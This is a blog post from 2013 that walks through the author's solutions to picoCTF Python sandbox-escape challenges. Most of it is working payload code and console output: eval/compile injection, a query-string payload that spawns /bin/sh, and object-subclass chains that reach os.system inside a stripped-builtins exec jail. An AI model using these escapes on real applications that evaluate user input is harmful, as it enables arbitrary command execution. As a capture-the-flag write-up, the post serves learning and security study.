---
layout: post
title:  "Escaping the Python Sandbox"
date:   2013-05-06
---

([ROP](http://www.zolmeister.com/2013/05/rop-return-oriented-programming-basics.html), [Overflow](http://www.zolmeister.com/2013/05/buffer-overflows-basics.html), [format 2](http://haeresy.tumblr.com/post/49835546090/format-2), [mildly evil](http://haeresy.tumblr.com/post/49815517485/mildly-evil), [more evil](http://haeresy.tumblr.com/post/49837209727/moreevil),&nbsp;[broken cbc](https://gist.github.com/11rcombs/5530361#file-aespaddingoracle-py),&nbsp;[evergreen](https://gist.github.com/11rcombs/5530211)&nbsp;([2](https://gist.github.com/Zolmeister/5530473)), [black hole](http://haeresy.tumblr.com/post/49832356680/black-hole), [broken rsa](https://gist.github.com/11rcombs/5530290), [chromatophoria](https://gist.github.com/Zolmeister/5530477)([2](https://gist.github.com/11rcombs/5530201#file-steg-js)), [harder serial](https://gist.github.com/Zolmeister/5530463),&nbsp;[robomunication](https://gist.github.com/Zolmeister/5530467))

tl;dr

`eval(compile('print key', '<stdin>', 'exec'))`

```
GET /index.html?a="}+eval("__import__('os').system('/bin/sh')")+{"
```

```
__builtins__['ww']=().__class__.__base__
__builtins__['w']=ww.__subclasses__()
__builtins__['y']=w[53].__enter__.__func__
__builtins__['a']=y.__globals__['linecache']
__builtins__['os']=a.checkcache.__globals__['os']
os.system('cat *')
().__class__.__base__`.__subclasses__()[53].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].system('sh')
```
This post is a write up of how I solved the python problems from [picoCTF](https://picoctf.com/). Basically the problems consist of a&nbsp;piece&nbsp;of python code, which takes user input, and then eval's it. Eval then allows us to get a shell. Lets explore.

```
	 # example1.py
     x = input("enter something to eval:\n")
     print "x:",x
```
This is python2.7, which means that the proper way to get input is with "raw_input". The issue with "input" is that it eval's the string. That means we can do things like this:

```
	enter something to eval:
     2*100
     x: 200
```
But if we try to do something like this:

```
     enter something to eval:
     print "hello world"
     Traceback (most recent call last):
      File "pytest.py", line 2, in <module>
       x = input("enter something to eval:\n")
      File "<string>", line 1
       print "hello world"
         ^
     SyntaxError: invalid syntax
```
We get an error. This is because [eval](http://docs.python.org/2/library/functions.html#eval) evaluates an _expression_. However we can get around this limitation by running some special code:

```
eval(compile('print "hello world"', '<stdin>', 'exec'))
```
Which looks like this:

```python
    def listFiles(a, dir, files):
       print files
     path.walk(".", listFiles, None)
```
And then we put it in our special method:

```
eval(compile('def listFiles(a, dir, files):\n\tprint files\npath.walk(".",listFiles,None)', '<stdin>', 'exec'))
```
And look! (we get an error) but it lists all of the files in the directory (specifically 'your_flag_here'). Lets read that file.

```
eval(compile('print open("your_flag_here").read()', '<stdin>', 'exec'))
```
Ok, that solves python 3\. Python 4 is a fair bit easier. Since we get the 'import' function, all we need is to get an eval on `"__import__('os').system('/bin/sh')"` and we're good to go. After a bit of research on [Query Strings](http://en.wikipedia.org/wiki/Query_string), we get this:

```
GET /index.html?a="}+eval("__import__('os').system('/bin/sh')")+{"
```
Cool, now onto the harder python 5 (this one was by far the most fun). Here is the source:

```python
     #!/usr/bin/python -u
     # task5.py
     from sys import modules
     modules.clear()
     del modules
     _raw_input = raw_input
     _BaseException = BaseException
     _EOFError = EOFError
     __builtins__.__dict__.clear()
     __builtins__ = None
     print 'Get a shell, if you can...'
     while 1:
      try:
       d = {'x':None}
       exec 'x='+_raw_input()[:50] in d
       print 'Return Value:', d['x']
      except _EOFError, e:
       raise e
      except _BaseException, e:
       print 'Exception:', e
```
The answer to this is the second chunk of code in the tl;dr at the top, but I'm going to explain how I got there. The first thing I did was look up to documentation for [exec](http://docs.python.org/release/2.0/ref/exec.html). Then I went to see what kinds of things I had access to.

```
     Get a shell, if you can...
     print "a"
     Exception: invalid syntax (<string>, line 1)
     eval("2+2")
     Exception: name 'eval' is not defined
     x
     Return Value: None
     x.__class__
     Return Value: <type 'NoneType'>
     __builtins__
     Return Value: {}
     y
     Exception: name 'y' is not defined
     __builtins__['y']=1337
     Return Value: 1337
     y
     Return Value: 1337
```
Cool, I can get around the 50 character limit by setting values to `__builtins__`. Lets dig deeper into that `x.__class__` (I didn't get there as quickly as below, but you get the idea. Just use `__base__`, `__bases__`, `__class__`, `__mro__`, `__subclasses__` etc - [read this](http://www.cafepy.com/article/python_attributes_and_methods/python_attributes_and_methods.html)):

```
	 x.__class__
     Return Value: <type 'NoneType'>
     x.__class__.__base__
     Return Value: <type 'object'>
     x.__class__.__base__.__subclasses__
     Return Value: <built-in method __subclasses__ of type object at 0x88cd40>
     x.__class__.__base__.__subclasses__()
     Return Value: [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>,...
```
Ok, I have a long list of values there, but now I have to find out if I can use them to get a shell. Some special values I noticed were:&nbsp;`<type 'file'>`,&nbsp;`<type 'module'>`, `<type 'zipimport.zipimporter'>`. Lets look at file first:

```
     #setup variable 'w' to access the values
     __builtins__['ww']=().__class__.__base__
     __builtins__['w']=ww.__subclasses__()
     # file
     w[40]
     # open a file
     w[40]('/etc/hosts').read()
     # write to a file
     w[40]('test','w').write('test string')
     Exception: [Errno 13] Permission denied: 'test'
     # lets try somewhere else
     w[40]('/tmp/test','w').write('test string')
     # read it back
     w[40]('/tmp/test').read()
```
Cool. Too bad we don't know the name of the key file (otherwise we could just read it in). Lets look at <module> next:

```
     w[47]
     Return Value: <type 'module'>
     w[47]('os')
     Return Value: <module 'os' (built-in)>
     w[47]('os').system
     Exception: 'module' object has no attribute 'system'
```
Yeah, I tried for a long time, but couldn't get it to create a useful object. Lets move on to [zipimporter](http://docs.python.org/2/library/zipimport.html). It looks like we should be able to read in a zip file containing a python module. The next step is figuring out how to get a zip onto the server. Remember that we can write arbitrary files to /tmp, and that python can write arbitrary bytes in strings with its escape sequence. This means we can do this:

```
     #the zip file in hex
     50 4b 03 04 14 03 00 00 08 00 ce ad a4 42 5e 13 60 d0 22 00 00 00 23 00 00 00 04 00 00 00 7a 2e 70 79 cb cc 2d c8 2f 2a 51 c8 2f e6 2a 28 ca cc 03 31 f4 8a 2b 8b 4b 52 73 35 d4 93 13 4b 14 b4 d4 35 b9 00 50 4b 01 02 3f 03 14 03 00 00 08 00 ce ad a4 42 5e 13 60 d0 22 00 00 00 23 00 00 00 04 00 00 00 00 00 00 00 00 00 20 80 a4 81 00 00 00 00 7a 2e 70 79 50 4b 05 06 00 00 00 00 01 00 01 00 32 00 00 00 44 00 00 00 00 00
     #save it to strings in 7 byte chuks
     __builtins__['a']='\x50\x4b\x03\x04\x14\x03\x00'
     __builtins__['b']='\x00\x08\x00\xce\xad\xa4\x42'
     ...
     __builtins__['t']='\x00\x44\x00\x00\x00\x00\x00'
     __builtins__['u']=a+b+c+d+e+f+g+h+i+j+k+l+m+n+o
     __builtins__['v']=u+p+q+r+s+t
     #write it to a file
     w[40]('/tmp/z','wb').write(v)
     #now lets load it in
     w[49]
     Return Value: <type 'zipimport.zipimporter'>
     #and....
     w[49]('/tmp/z').load_module('z')
     Exception: can't decompress data; zlib not available
```
That last part... after all that work... made me... sad. Very sad.

But I had to move on, and get past the fact that they COMPILED PYTHON WITHOUT ZLIB. Next, I tried to just overwrite their file with my own:

```
     w[40]('task5.py','w').write('z')
     Exception: [Errno 13] Permission denied: 'task5.py'
```
No luck. I then googled around and found [this page](http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/). The main post seemed like it could work, but was too complicated for me to fully grasp (and also there's a 50 character limit per entry, so it would take forever to input it). What interested me more was the comment:

#### TL;DR

```
     __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
     import sys; print open(sys.argv[0]).read()
```
Hey, I can do that!

```
     # the class
     w[53]
     Return Value: <class 'warnings.catch_warnings'>
     #and.....
     w[53]()._module.__builtins__
     Exception: 'warnings'
```
Nope. Not today.
So I kept looking (I was going though the modules by hand for a while, but no luck)
Then I found this [script](http://nedbatchelder.com/blog/201302/finding_python_3_builtins.html). Huh, that looks interesting. Lets run it on my machine (after reading the source).

```
    ...
    Examining codecs.IncrementalEncoder
     Looks like codecs.IncrementalEncoder.__init__.__func__.__globals__['__builtins__'] might be builtins
     Examining codecs.IncrementalEncoder()
	...
```

Well, as it turns out, those are false positives (they return the local broken `__builtins__`). I added this to the searching script to have it find less false positives:

```python
	 from sys import modules
     modules.clear()
     del modules
```
Now the results are less, but still quite&nbsp;numerous. Based on the information previously learned from [this guy](http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/), I realized that the key was to get into an objects `__enter__`. Scrolling though the&nbsp;indices&nbsp; we see that warnings.catch_warnings (previously caused an exception) can be accessed through its `__enter__` param (without invoking it). This looks quite promising, and using one of the strings from the search, we get this:

```
     # target, with 50 character max per line
     # warnings.catch_warnings.__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os']
     w[53]
     Return Value: <class 'warnings.catch_warnings'>
     __builtins__['y']=w[53].__enter__.__func__
     Return Value: <function __enter__ at 0x7fdf74cfe1b8>
     y
     Return Value: <function __enter__ at 0x7fdf74cfe1b8>
     __builtins__['a']=y.__globals__['linecache']
     Return Value: <module 'linecache' from '/usr/lib/python2.7/linecache.pyc'>
     __builtins__['os']=a.checkcache.__globals__['os']
     Return Value: <module 'os' from '/usr/lib/python2.7/os.pyc'>
     os.system('sh')
```
[Thank you sir, may I have another?](http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/)
